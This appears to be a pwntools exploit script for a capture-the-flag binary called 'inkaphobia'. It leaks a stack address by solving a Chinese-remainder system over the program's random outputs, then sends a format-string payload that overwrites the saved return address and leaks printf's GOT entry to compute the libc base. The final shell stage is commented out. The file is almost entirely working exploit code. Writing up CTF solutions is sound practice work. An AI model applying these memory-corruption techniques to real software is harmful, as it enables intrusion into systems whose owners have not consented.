from pwn import *
import sys

def start(argv=[], *a, **kw):
    if args.GDB:  # GDB NOASLR
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # REMOTE server port
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process(['./ld-2.31.so', '--preload', './libc.so.6', exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


exe = './inkaphobia'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6')
# warning/info/debug
context.log_level = 'info'

def inverse_Fp(a, p):
    u = a
    v = p
    x1, x2 = 1, 0
    while(u != 1):
        q = v // u
        r = v - q*u
        x = x2-q*x1

        v = u
        u = r
        x2 = x1
        x1 = x
    return x1%p

def chinese_remainder(n, a):
    sum = 0
    prod = math.prod(n)
    for a_i, n_i in zip(a, n):
        p = prod // n_i
        sum += a_i * p * inverse_Fp(p, n_i)
    return sum % prod

def leak_stack():
    a = []
    # the biggest prime <= 127
    n = [101, 103, 107, 109, 113, 127]
    for i in n:
        io.sendlineafter('max value: ', bytes(str(i), "utf-8"))
        io.recvuntil(' number: ')
        a.append(int(io.recvline()[:-1]))
    a1 = chinese_remainder(n, a)
    total = math.prod(n)
    while(a1 < 0x7f0000000000):
        a1 += total
    return a1

ret = 0x4006de

io = start()

stack_addr = leak_stack()
log.info("stack = %#x ", stack_addr)
# random_value [rbp-214h]
main_ret = stack_addr + 0x214 + 8
canary = stack_addr + 0x214 - 8

offset = 8
payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAA%22$6s" + fmtstr_payload(offset+4, {
    main_ret: ret,
    main_ret+8: elf.symbols['main']
}, numbwritten=32) + p64(elf.got['printf'])
# print(payload)
io.sendlineafter('?', payload)
io.recvuntil(b'coming, ')
leak_printf = u64(io.recvuntil(b"Welc")[24:24+6].ljust(8, b'\x00'))

libc.address = leak_printf - libc.symbols.printf
log.info('base= %#x', libc.address)


# io.interactive()

# flag = io.recv()
# success(flag)